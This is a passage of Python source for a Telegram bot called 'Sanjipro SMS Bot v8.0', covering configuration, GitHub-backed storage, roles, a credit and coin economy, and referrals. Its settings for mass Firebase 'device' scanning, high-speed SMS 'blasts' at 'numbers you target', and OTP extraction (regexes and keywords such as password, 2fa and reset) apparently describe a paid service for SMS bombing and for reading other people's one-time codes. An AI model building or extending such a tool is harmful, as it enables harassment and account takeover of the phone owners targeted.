# ============================================================
#  SANJIPRO SMS BOT — v8.0 APEX
#  Full rewrite — bug fixes + new features
#  GitHub sync • Force join • OTP fresh+refund • Terms gate
#  Multi-service maintenance • Group support • Coming Soon
#  Referral leaderboard • Ticket reply system
# ============================================================
#  INSTALL:
#    pip install -r requirements.txt
#  RUN:
#    python bot.py
# ============================================================

import asyncio
import base64
import copy
import csv
import hashlib
import io
import json
import logging
import os
import random
import re
import signal
import string
import sys
import threading
import time
from copy import deepcopy
from datetime import datetime, timedelta, timezone
from html import escape as html_escape
from urllib.parse import urlparse, quote as url_quote

try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

import aiohttp
from aiogram import BaseMiddleware, Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter, TelegramForbiddenError
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile, CallbackQuery, ChatMemberUpdated, FSInputFile,
    InlineKeyboardButton, InlineKeyboardMarkup, Message,
    ReplyKeyboardRemove,
)

# ============================================================
#  LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("Sanjipro")

# ============================================================
#  CONFIG HELPERS
# ============================================================
def _env_int(key, default):
    try:
        return int(os.environ.get(key, str(default)).strip())
    except Exception:
        return default

def _env_str(key, default=""):
    v = os.environ.get(key)
    return v if v is not None else default

def _env_bool(key, default=False):
    v = os.environ.get(key)
    if v is None:
        return default
    return str(v).strip().lower() in ("1", "true", "yes", "on")

# ============================================================
#  ENV — BOT
# ============================================================
BOT_TOKEN = _env_str("BOT_TOKEN", "").strip()
LOG_CHANNEL_ID = _env_int("LOG_CHANNEL_ID", 0)
MAIN_OWNER = _env_int("MAIN_OWNER", 0)
SUPER_ADMIN_NAME = _env_str("SUPER_ADMIN_NAME", "sanjipro5")
SUPER_ADMIN_LINK = _env_str("SUPER_ADMIN_LINK", "https://t.me/sanjipro5")
SUPER_ADMINS = [MAIN_OWNER] if MAIN_OWNER else []

# ============================================================
#  ENV — GITHUB PERSISTENCE
# ============================================================
GITHUB_TOKEN = _env_str("GITHUB_TOKEN", "").strip()
GITHUB_REPO = _env_str("GITHUB_REPO", "").strip()
GITHUB_BRANCH = _env_str("GITHUB_BRANCH", "main").strip() or "main"
GITHUB_FILE = _env_str("GITHUB_FILE", "sanjipro_data.json").strip() or "sanjipro_data.json"
GITHUB_SYNC_INTERVAL = _env_int("GITHUB_SYNC_INTERVAL", 600)
GITHUB_ENABLED = bool(GITHUB_TOKEN and GITHUB_REPO)
GITHUB_DEBOUNCE_SEC = 15
GITHUB_MAX_PUSH_PER_MIN = 6

# ============================================================
#  DATA DIR
# ============================================================
_DATA_DIR = _env_str("SANJIPRO_DATA_DIR", "").strip()
if not _DATA_DIR:
    _DATA_DIR = os.path.join(os.path.expanduser("~"), ".sanjipro_data")
try:
    os.makedirs(_DATA_DIR, exist_ok=True)
except Exception:
    _DATA_DIR = "."

_DATA_FILE = os.path.join(_DATA_DIR, "sanjipro_data.json")
_BACKUP_FILE = os.path.join(_DATA_DIR, "sanjipro_data.backup.json")
_BACKUP_FILE_2 = os.path.join(_DATA_DIR, "sanjipro_data.backup2.json")
_TMP_FILE = os.path.join(_DATA_DIR, "sanjipro_data.tmp.json")
_LOCK_FILE = os.path.join(_DATA_DIR, ".sanjipro.lock")
_HEARTBEAT_FILE = os.path.join(_DATA_DIR, ".sanjipro.heartbeat")
_GITHUB_CONFIG_FILE = os.path.join(_DATA_DIR, "github_config.json")

# GitHub credentials override — local file wins over env
try:
    with open(_GITHUB_CONFIG_FILE, "r", encoding="utf-8") as _gcf:
        _gh_cfg = json.load(_gcf)
    GITHUB_TOKEN = str(_gh_cfg.get("token", GITHUB_TOKEN)).strip()
    GITHUB_REPO = str(_gh_cfg.get("repo", GITHUB_REPO)).strip()
    GITHUB_BRANCH = str(_gh_cfg.get("branch", GITHUB_BRANCH)).strip() or "main"
    GITHUB_FILE = str(_gh_cfg.get("file", GITHUB_FILE)).strip() or "sanjipro_data.json"
    GITHUB_ENABLED = bool(GITHUB_TOKEN and GITHUB_REPO)
except (OSError, ValueError, TypeError):
    pass

# ============================================================
#  VERSION / START
# ============================================================
_VERSION = "8.0 Apex"
_START_TIME = time.time()

# ============================================================
#  TIMING / LIMITS
# ============================================================
_WATCHDOG_INTERVAL = 60
_HEARTBEAT_INTERVAL = 20
_WATCHDOG_MAX_FAILS = 5
_LOCK_STALE_SEC = 180

_CALLBACK_CONCURRENCY = 100
_USER_COOLDOWN_SEC = 0.25

_GLOBAL_BLAST_LIMIT = 5
_BLAST_QUEUE_MAX = 50
_SEND_CONCURRENCY = 70

SPEED_FAST = 0.001
SPEED_MEDIUM = 0.05
SPEED_SLOW = 0.2
SPEED_DEFAULT = SPEED_FAST

CURRENT_POWER_MODE = 2
ALLOWED_POWER_MODES = (2, 3, 4, 5, 10)

# Global Telegram msg rate limit — 25/sec below the 30 limit
_GLOBAL_MSG_SEM = None  # created in part 10

# ============================================================
#  FIREBASE SCAN CONFIG
# ============================================================
_FB_CONCURRENCY = 200
_DEV_CONCURRENCY = 400
_HTTP_CONNECT_TIMEOUT = 5
_HTTP_READ_TIMEOUT = 8
_HTTP_POOL_LIMIT = 1000
_HTTP_PER_HOST = 100
_DNS_CACHE_TTL = 600
_DEVICE_BATCH = 100
_BACKGROUND_SCAN_INTERVAL = 10.0
_PROGRESS_UPDATE_INTERVAL = 3.0
_PANEL_REFRESH_INTERVAL = 25.0
_SCAN_ADAPTIVE_MIN = 5
_SCAN_ADAPTIVE_MAX = 30

# ============================================================
#  OTP CONFIG
# ============================================================
_OTP_LIVE_TIMEOUT = 300
_OTP_POLL_INTERVAL = 4
_OTP_COST_DEFAULT = 1
_OTP_FRESH_WINDOW = 900
_OTP_MAX_SCAN = 300
_OTP_MAX_MSG_BODY = 4000

# OTP extraction — combined regexes
_OTP_RE_DIGITS = re.compile(r"(?<![\d])(\d{4,8})(?![\d])")
_OTP_RE_ALNUM = re.compile(r"(?<![A-Z0-9])([A-Z0-9]{4,8}(?:-[A-Z0-9]{2,4})?)(?![A-Z0-9])")
_OTP_RE_SPACED = re.compile(r"(?<!\d)(\d(?:[ \-]\d){3,7})(?!\d)")

_OTP_KEYWORDS = (
    "otp", "code", "verify", "verification", "pin",
    "login", "secure", "password", "passcode", "auth",
    "confirm", "token", "access", "signin", "sign-in",
    "2fa", "mfa", "one-time", "one time", "activation",
    "reset", "unlock", "validation"
)

_OTP_BLOCKLIST = {
    "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026",
    "1234", "0000", "1111", "2222", "3333", "4444", "5555", "6666",
    "7777", "8888", "9999", "1000", "2000", "3000",
}

# ============================================================
#  FIREBASE IMPORT
# ============================================================
_FB_UPLOAD_WAIT = 3.0
_FB_IMPORT_MAX_BYTES = 5 * 1024 * 1024  # 5MB per file
_FB_IMPORT_MAX_FILES = 20
_URL_REGEX = re.compile(r"https?://[^\s<>\"'\)\]\}]+")

# ============================================================
#  FORCE JOIN
# ============================================================
_FJ_CHECK_TIMEOUT = 8
_FJ_RETRY_INTERVAL = 30

# ============================================================
#  SCHEDULER
# ============================================================
_SCHED_TICK = 15

# ============================================================
#  COINS
# ============================================================
_DAILY_BONUS_COINS = _env_int("DAILY_BONUS_COINS", 2)
_DAILY_BONUS_HOURS = 24

# ============================================================
#  EMOJI IDs (Telegram custom emoji)
# ============================================================
EMOJI_FIRE      = "5289722755871162900"
EMOJI_STAR      = "5372849966689566579"
EMOJI_ROCKET    = "5359664288241829619"
EMOJI_CROWN     = "6237927637906364256"
EMOJI_SHIELD    = "6235476345451716705"
EMOJI_MONEY     = "6244678063775289843"
EMOJI_PHONE     = "6239930832128056797"
EMOJI_CHECK     = "4958689671950369798"
EMOJI_CROSS     = "4958900559139570572"
EMOJI_WARNING   = "4958526153955476488"
EMOJI_LOCK      = "4956719506027185156"
EMOJI_GIFT      = "5084613633418199991"
EMOJI_BELL      = "5098265504796115765"
EMOJI_GEAR      = "5116414868357907335"
EMOJI_VIDEO     = "5372849966689566579"
EMOJI_COIN      = "5375298751547576690"
EMOJI_OTP       = "5431584540232207838"
EMOJI_USER      = "5373098009640836781"
EMOJI_SEARCH    = "5258396243666681158"
EMOJI_CLOCK     = "5382194935057372936"
EMOJI_CHART     = "5384369298343860451"
EMOJI_PLUS      = "5391159900976473065"
EMOJI_MINUS     = "5393312304441345779"
EMOJI_FILE      = "5445353826677358176"
EMOJI_TAG       = "5373098009640836781"
EMOJI_NEW       = "5289722755871162900"
EMOJI_BOOK      = "5372849966689566579"
FIRE_EFFECT_ID  = "5104841245755180586"

# ============================================================
#  SMALL CAPS MAP
# ============================================================
_SC_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(t):
    return (t or "").translate(_SC_MAP)

def em(eid, fb="⭐"):
    if eid:
        return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
    return fb

def esc(v):
    return html_escape(str(v if v is not None else ""))

def now_ts():
    return int(time.time())

def btn(text, cb, eid=None, fb="", style=None):
    label = sc(text)
    kwargs = {"text": label, "callback_data": cb}
    if eid:
        try:
            kwargs["icon_custom_emoji_id"] = eid
        except Exception:
            pass
    if style in ("primary", "success", "danger"):
        try:
            kwargs["style"] = style
        except Exception:
            pass
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        return InlineKeyboardButton(text=label, callback_data=cb)

def btn_url(text, url, eid=None, fb="", style=None):
    label = sc(text)
    kwargs = {"text": label, "url": url}
    if eid:
        try:
            kwargs["icon_custom_emoji_id"] = eid
        except Exception:
            pass
    if style in ("primary", "success", "danger"):
        try:
            kwargs["style"] = style
        except Exception:
            pass
    try:
        return InlineKeyboardButton(**kwargs)
    except TypeError:
        return InlineKeyboardButton(text=label, url=url)

def kb(*rows):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row] for row in rows
    ])

# ============================================================
#  MASKED FIREBASE LABEL (admin sees "Firebase 1", owner sees real)
# ============================================================
def fb_label_for(fb, index, viewer_is_owner):
    if viewer_is_owner:
        return fb.get("label") or fb["url"][:30]
    return f"Firebase {index + 1}"

# ============================================================
#  GLOBAL STATE
# ============================================================
_DB_LOCK = threading.RLock()
_DATA_CACHE = None
_HTTP_SESSION = None
_SHUTDOWN_REQUESTED = False

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0.0
LAST_SCAN_DURATION = 0.0
SCANNING_IN_PROGRESS = False
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}
FB_SCAN_ERRORS = {}
LAST_KNOWN_DEVICE_COUNT = 0
LAST_KNOWN_FB_COUNTS = {}

OTP_LIVE_SESSIONS = {}
_FB_UPLOAD_BATCH = {}
SCHEDULED_BLASTS = []
LAST_ACTIVITY_TS = time.time()

_BG_TASKS = set()
CALLBACK_SEM = None  # created in part 10
GLOBAL_BLAST_SEM = None  # created in part 10
_USER_COOLDOWN = {}
_OWNER_PANEL_STATE = {}
_GITHUB_SYNC_LOCK = None  # created in part 10
_GITHUB_PUSH_QUEUE = []
_GITHUB_PUSH_TIMES = []
_GITHUB_PUSH_LOCK = threading.Lock()

# Terms gate temp state — agreement pending
_PENDING_TERMS = {}

def _spawn(coro):
    t = asyncio.create_task(coro)
    _BG_TASKS.add(t)
    t.add_done_callback(_BG_TASKS.discard)
    return t

async def send_log(bot: Bot, text: str):
    if not LOG_CHANNEL_ID:
        return False
    try:
        await bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return True
    except Exception as exc:
        log.warning("Log channel send failed: %s", exc)
        return False

def _touch_activity():
    global LAST_ACTIVITY_TS
    LAST_ACTIVITY_TS = time.time()

# ============================================================
#  LOCK FILE
# ============================================================
def _acquire_lock():
    if os.path.exists(_LOCK_FILE):
        try:
            age = time.time() - os.path.getmtime(_LOCK_FILE)
            if age > _LOCK_STALE_SEC:
                try:
                    os.remove(_LOCK_FILE)
                except Exception:
                    pass
            else:
                with open(_LOCK_FILE, "r") as f:
                    old_pid = int(f.read().strip())
                if old_pid == os.getpid():
                    return
                if sys.platform == "win32":
                    try:
                        os.remove(_LOCK_FILE)
                    except Exception:
                        pass
                else:
                    try:
                        os.kill(old_pid, 0)
                        log.critical(f"Another instance PID={old_pid}. Exit.")
                        sys.exit(1)
                    except OSError:
                        try:
                            os.remove(_LOCK_FILE)
                        except Exception:
                            pass
        except Exception:
            try:
                os.remove(_LOCK_FILE)
            except Exception:
                pass
    try:
        with open(_LOCK_FILE, "w") as f:
            f.write(str(os.getpid()))
    except Exception as e:
        log.warning(f"Lock write failed: {e}")

def _release_lock():
    try:
        if os.path.exists(_LOCK_FILE):
            os.remove(_LOCK_FILE)
    except Exception:
        pass

def _heartbeat():
    try:
        with open(_HEARTBEAT_FILE, "w") as f:
            f.write(str(int(time.time())))
    except Exception:
        pass

# ============================================================
#  HTTP SESSION (singleton)
# ============================================================
async def get_http_session():
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        connector = aiohttp.TCPConnector(
            limit=_HTTP_POOL_LIMIT, limit_per_host=_HTTP_PER_HOST,
            ttl_dns_cache=_DNS_CACHE_TTL, force_close=False,
            enable_cleanup_closed=True,
        )
        _HTTP_SESSION = aiohttp.ClientSession(connector=connector)
    return _HTTP_SESSION

async def close_http_session():
    global _HTTP_SESSION
    if _HTTP_SESSION and not _HTTP_SESSION.closed:
        try:
            await _HTTP_SESSION.close()
        except Exception:
            pass
    _HTTP_SESSION = None

# ============================================================
#  DEFAULT DATA SHAPE (v8.0)
# ============================================================
def _default_data():
    return {
        # --- core identity ---
        "owners": [MAIN_OWNER] if MAIN_OWNER else [],
        "admins": [],
        "banned": [],
        "approved": [],

        # --- firebase + devices ---
        "firebases": [],
        "firebase_health": {},
        "firebase_meta": {},

        # --- users ---
        "users": {},
        "user_notes": {},
        "user_tags": {},
        "user_groups": {},
        "referral_tree": {},
        "refer_code_index": {},   # code -> uid (fast lookup)

        # --- stats ---
        "stats": {
            "total_sent": 0,
            "total_failed": 0,
            "api_usage": {},
            "otp_fetches": 0,
            "otp_refunds": 0,
        },

        # --- force join ---
        "force_join": {
            "enabled": False,
            "channels": [],
            "bypass": [],
        },

        # --- pricing / redeem ---
        "pricing": {"plans": []},
        "redeem_codes": {},

        # --- terms gate ---
        "terms": {
            "version": 1,
            "text": (
                "<b>Terms &amp; Conditions</b>\n"
                "<i>Last updated: 2026</i>\n\n"
                "<b>1. Acceptance</b>\n"
                "By using this bot you confirm that you are at least 18 years of age, "
                "or have the legal capacity to accept these terms in your jurisdiction.\n\n"
                "<b>2. Purpose</b>\n"
                "This bot provides communication tooling. You are solely responsible "
                "for how you use it, including any content you send, the numbers you "
                "target, and your compliance with local laws.\n\n"
                "<b>3. Risk</b>\n"
                "Use of this bot is entirely at your own risk. The operator makes no "
                "warranties about availability, accuracy, or fitness for any purpose. "
                "You accept full legal and financial responsibility for your actions.\n\n"
                "<b>4. Prohibited use</b>\n"
                "You may not use the bot to harass, defraud, impersonate, or send "
                "unsolicited bulk messages to recipients who have not consented.\n\n"
                "<b>5. Data</b>\n"
                "The bot stores your Telegram ID, usage counters, and transactional "
                "history to operate the service. This data is not sold.\n\n"
                "<b>6. No warranty</b>\n"
                "The service is provided \"as is\" without warranty of any kind.\n\n"
                "<b>7. Changes</b>\n"
                "These terms may change. Continued use after a version bump means "
                "you accept the updated terms.\n\n"
                "<b>By tapping \"I Agree\", you confirm you have read, understood, "
                "and accepted these terms. You accept all responsibility and risk.</b>"
            ),
            "accepted": {},
        },

        # --- settings ---
        "settings": {
            "ref_credits": 3,
            "ref_coins": 1,
            "max_owners": 6,
            "owner_display": SUPER_ADMIN_NAME,
            "otp_cost": _OTP_COST_DEFAULT,
            "otp_fresh_window": _OTP_FRESH_WINDOW,
            "maintenance": False,
            "maintenance_msg": "🔧 Bot is under maintenance. Please try again later.",
            "maintenance_services": {},
            "maintenance_msg_service": {},
            "daily_bonus_credits": _DAILY_BONUS_COINS,
            "strict_force_join": True,
            "daily_report": True,
            "terms_required": True,
            "force_join_required": True,
        },

        # --- histories ---
        "sms_history": {},
        "otp_history": {},
        "otp_favorites": {},
        "transactions": {},

        # --- activity / audit ---
        "activity_log": [],
        "audit_log": [],

        # --- protected ---
        "protected_numbers": {},

        # --- videos ---
        "videos": [],
        "ban_reasons": {},

        # --- misc ---
        "templates": {},
        "scheduled": [],
        "appeals": [],
        "tickets": [],
        "ticket_replies": {},   # ticket_id -> [ { from_uid, text, ts } ]
        "announcements": [],

        # --- upcoming updates (new) ---
        "upcoming_updates": [],
        "upcoming_visible": True,

        # --- groups (new) ---
        "groups": {},           # chat_id -> { title, added_at, muted, welcome }
        "group_settings": {},   # chat_id -> { stop, welcome, mute }

        # --- OTP refunds ---
        "otp_pending": {},      # uid -> { cost, device_id, ts }

        # --- watchdog ---
        "watchdog_stats": {
            "scanner_fails": 0,
            "otp_fails": 0,
            "github_fails": 0,
        },
        "last_github_sync": 0,
        "version": _VERSION,
    }

# ============================================================
#  DEEP MERGE
# ============================================================
def _merge(data, defaults):
    for k, v in defaults.items():
        if k not in data:
            data[k] = deepcopy(v)
        elif isinstance(v, dict) and isinstance(data.get(k), dict):
            _merge(data[k], v)
    return data

def _read_json(path):
    with open(path, "r", encoding="utf-8-sig") as f:
        return json.load(f)

# ============================================================
#  LOAD FROM DISK (with backup before any write)
# ============================================================
def _load_from_disk():
    global PROTECTED_NUMBERS
    candidates = [_DATA_FILE, _BACKUP_FILE, _BACKUP_FILE_2]
    for path in candidates:
        if not os.path.exists(path):
            continue
        try:
            data = _read_json(path)
            _merge(data, _default_data())

            # ensure main owner present
            if MAIN_OWNER and MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)

            # normalize users
            for u in data.get("users", {}).values():
                u.setdefault("credits", 0)
                u.setdefault("coins", 0)
                u.setdefault("sms_history", [])
                u.setdefault("manual_added_credits", 0)
                u.setdefault("manual_added_coins", 0)
                u.setdefault("uses", 0)
                u.setdefault("otp_uses", 0)
                u.setdefault("joined_at", now_ts())
                u.setdefault("last_active", 0)
                u.setdefault("daily_bonus_ts", 0)
                u.setdefault("tags", [])
                u.setdefault("notes", "")
                u.setdefault("premium", False)
                u.setdefault("terms_accepted", False)
                u.setdefault("terms_accepted_at", 0)

            PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
            log.info(f"[DATA] loaded from {path}")
            return data
        except Exception as e:
            log.error(f"[DATA] load failed {path}: {e}")

    # fresh
    d = _default_data()
    try:
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
    except Exception as e:
        log.error(f"[DATA] init write failed: {e}")
    return d

def load():
    global _DATA_CACHE
    with _DB_LOCK:
        if _DATA_CACHE is None:
            _DATA_CACHE = _load_from_disk()
        return _DATA_CACHE

# ============================================================
#  ATOMIC SAVE (local + debounced github push)
# ============================================================
def _write_local_sync(d):
    try:
        with open(_TMP_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
            f.flush()
            try:
                os.fsync(f.fileno())
            except Exception:
                pass
        if os.path.exists(_BACKUP_FILE):
            try:
                os.replace(_BACKUP_FILE, _BACKUP_FILE_2)
            except Exception:
                pass
        if os.path.exists(_DATA_FILE):
            try:
                os.replace(_DATA_FILE, _BACKUP_FILE)
            except Exception:
                pass
        os.replace(_TMP_FILE, _DATA_FILE)
        return True
    except Exception as e:
        log.error(f"[SAVE] local write failed: {e}")
        return False

def save(_d=None, push_github=True):
    with _DB_LOCK:
        d = _d if _d is not None else _DATA_CACHE
        if d is None:
            return
        d["protected_numbers"] = PROTECTED_NUMBERS
        d["last_github_sync"] = int(time.time())
        ok = _write_local_sync(d)
        if ok and push_github and GITHUB_ENABLED:
            _queue_github_push()

def _queue_github_push():
    """Debounced push — single worker processes queue."""
    with _GITHUB_PUSH_LOCK:
        _GITHUB_PUSH_QUEUE.append(now_ts())

# ============================================================
#  GITHUB SYNC (URL-safe path, debounced, rate-limited)
# ============================================================
_GH_API = "https://api.github.com"

def _gh_headers():
    return {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json",
        "User-Agent": "sanjipro-bot-v8",
    }

def _gh_url():
    encoded_path = "/".join(url_quote(seg, safe="") for seg in GITHUB_FILE.split("/"))
    return f"{_GH_API}/repos/{GITHUB_REPO}/contents/{encoded_path}"

async def _github_pull():
    if not GITHUB_ENABLED:
        return None
    url = f"{_gh_url()}?ref={url_quote(GITHUB_BRANCH, safe='')}"
    try:
        sess = await get_http_session()
        async with sess.get(url, headers=_gh_headers(),
                            timeout=aiohttp.ClientTimeout(total=20)) as r:
            if r.status == 200:
                j = await r.json()
                content_b64 = "".join((j.get("content") or "").split())
                raw = base64.b64decode(content_b64).decode("utf-8-sig")
                data = json.loads(raw)
                log.info("[GH] data pulled")
                return data
            elif r.status == 404:
                log.info("[GH] file not found on repo (first run)")
            else:
                log.warning(f"[GH] pull status {r.status}")
    except Exception as e:
        log.warning(f"[GH] pull failed: {e}")
    return None

async def _github_push(data):
    if not GITHUB_ENABLED:
        return False
    url = _gh_url()
    headers = _gh_headers()
    try:
        content = json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8")
        content_b64 = base64.b64encode(content).decode("utf-8")
        sess = await get_http_session()

        sha = None
        async with sess.get(
            f"{url}?ref={url_quote(GITHUB_BRANCH, safe='')}",
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            if r.status == 200:
                try:
                    j = await r.json()
                    sha = j.get("sha")
                except Exception:
                    pass

        payload = {
            "message": f"auto-save {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "content": content_b64,
            "branch": GITHUB_BRANCH,
        }
        if sha:
            payload["sha"] = sha

        async with sess.put(url, headers=headers, json=payload,
                            timeout=aiohttp.ClientTimeout(total=25)) as r:
            if r.status in (200, 201):
                log.info("[GH] data pushed")
                return True
            body = await r.text()
            log.warning(f"[GH] push status {r.status}: {body[:120]}")
            return False
    except Exception as e:
        log.warning(f"[GH] push exception: {e}")
    return False

# ============================================================
#  USER HELPERS
# ============================================================
def reg_user(uid, name, d):
    k = str(uid)
    is_new = k not in d["users"]
    if is_new:
        d["users"][k] = {
            "name": str(name)[:64],
            "uses": 0,
            "otp_uses": 0,
            "credits": 0,
            "coins": 0,
            "manual_added_credits": 0,
            "manual_added_coins": 0,
            "joined_at": now_ts(),
            "last_active": now_ts(),
            "daily_bonus_ts": 0,
            "refer_code": None,
            "referred_by": None,
            "sms_history": [],
            "tags": [],
            "notes": "",
            "premium": False,
            "terms_accepted": False,
            "terms_accepted_at": 0,
        }
    return is_new

def log_activity(d, action, uid, details=""):
    d.setdefault("activity_log", []).append({
        "timestamp": now_ts(),
        "uid": uid,
        "action": action,
        "details": str(details)[:300],
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def log_audit(d, action, uid, details=""):
    d.setdefault("audit_log", []).append({
        "timestamp": now_ts(),
        "uid": uid,
        "action": action,
        "details": str(details)[:400],
    })
    if len(d["audit_log"]) > 1500:
        d["audit_log"] = d["audit_log"][-1500:]

# ============================================================
#  ROLE HELPERS
# ============================================================
def is_main_owner(uid): return uid == MAIN_OWNER and uid != 0
def is_owner(uid, d): return uid in d.get("owners", []) or uid in SUPER_ADMINS
def is_admin(uid, d): return is_owner(uid, d) or uid in d.get("admins", [])
def is_banned(uid, d): return uid in d.get("banned", [])
def is_premium(uid, d):
    u = d.get("users", {}).get(str(uid), {})
    return bool(u.get("premium", False))

def can_use(uid, d):
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("settings", {}).get("maintenance"):
        return False
    return True

def role_tag(uid, d):
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if is_premium(uid, d): return f"{em(EMOJI_STAR, '💎')} ᴘʀᴇᴍɪᴜᴍ"
    return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"

# ============================================================
#  CREDITS / COINS
# ============================================================
def get_user_credits(uid, d):
    return int(d.get("users", {}).get(str(uid), {}).get("credits", 0))

def get_user_coins(uid, d):
    return int(d.get("users", {}).get(str(uid), {}).get("coins", 0))

def _log_tx(d, uid, currency, delta, reason=""):
    hist = d.setdefault("transactions", {}).setdefault(str(uid), [])
    hist.append({
        "ts": now_ts(),
        "currency": currency,
        "delta": delta,
        "reason": reason[:80],
    })
    if len(hist) > 500:
        d["transactions"][str(uid)] = hist[-500:]

def add_credits(uid, amount, d, is_manual=False, reason=""):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    d["users"][k].setdefault("manual_added_credits", 0)
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + int(amount)
    if is_manual:
        d["users"][k]["manual_added_credits"] += int(amount)
    _log_tx(d, uid, "credits", int(amount), reason)

def add_coins(uid, amount, d, is_manual=False, reason=""):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {
            "credits": 0, "coins": 0,
            "manual_added_credits": 0, "manual_added_coins": 0,
            "name": "User",
        }
    d["users"][k].setdefault("manual_added_coins", 0)
    d["users"][k]["coins"] = d["users"][k].get("coins", 0) + int(amount)
    if is_manual:
        d["users"][k]["manual_added_coins"] += int(amount)
    _log_tx(d, uid, "coins", int(amount), reason)

def deduct_credits(uid, amount, d, reason=""):
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("credits", 0) >= amount:
            d["users"][k]["credits"] -= amount
            _log_tx(d, uid, "credits", -int(amount), reason)
            return True
    return False

def deduct_coins(uid, amount, d, reason=""):
    k = str(uid)
    if k in d.get("users", {}):
        if d["users"][k].get("coins", 0) >= amount:
            d["users"][k]["coins"] -= amount
            _log_tx(d, uid, "coins", -int(amount), reason)
            return True
    return False

# ============================================================
#  REFERRAL
# ============================================================
def generate_refer_code(uid, d):
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]

    index = d.setdefault("refer_code_index", {})
    for _ in range(30):
        code = "SJ" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in index:
            break
    else:
        code = "SJ" + str(now_ts())[-8:]

    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
        index[code] = k
    return code

def process_referral(new_uid, code, d):
    index = d.setdefault("refer_code_index", {})
    referrer_key = index.get(code)
    if not referrer_key:
        # fallback scan
        for uid_str, udata in d.get("users", {}).items():
            if udata.get("refer_code") == code:
                referrer_key = uid_str
                index[code] = uid_str
                break
    if not referrer_key:
        return False, "Invalid", None
    try:
        referrer_uid = int(referrer_key)
    except Exception:
        return False, "Invalid", None
    if referrer_uid == new_uid:
        return False, "Self", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, "Already", None

    rc = int(d.get("settings", {}).get("ref_credits", 3))
    rcoin = int(d.get("settings", {}).get("ref_coins", 1))
    add_credits(new_uid, rc, d, False, "referral")
    add_coins(new_uid, rcoin, d, False, "referral")
    add_credits(referrer_uid, rc, d, False, "referral-bonus")
    add_coins(referrer_uid, rcoin, d, False, "referral-bonus")
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    d.setdefault("referral_tree", {}).setdefault(str(referrer_uid), []).append(int(new_uid))
    return True, f"+{rc} credits +{rcoin} coins", referrer_uid

def referral_leaderboard(d, period="all", limit=10):
    """Top referrers. period: all | 7d | 30d"""
    tree = d.get("referral_tree", {})
    users = d.get("users", {})
    now = now_ts()
    cutoff = 0
    if period == "7d":
        cutoff = now - 7 * 86400
    elif period == "30d":
        cutoff = now - 30 * 86400

    counts = {}
    for referrer_uid, referred_list in tree.items():
        if not isinstance(referred_list, list):
            continue
        cnt = 0
        for r in referred_list:
            if cutoff:
                ru = users.get(str(r), {})
                if ru.get("joined_at", 0) < cutoff:
                    continue
            cnt += 1
        if cnt > 0:
            counts[str(referrer_uid)] = cnt

    ranked = sorted(counts.items(), key=lambda x: -x[1])[:limit]
    out = []
    for i, (uid, cnt) in enumerate(ranked, 1):
        u = users.get(uid, {})
        out.append({
            "rank": i,
            "uid": int(uid),
            "name": u.get("name", "?"),
            "count": cnt,
        })
    return out

# ============================================================
#  FORMATTERS
# ============================================================
def mask_number(number):
    n = str(number or "")
    if len(n) <= 4:
        return n
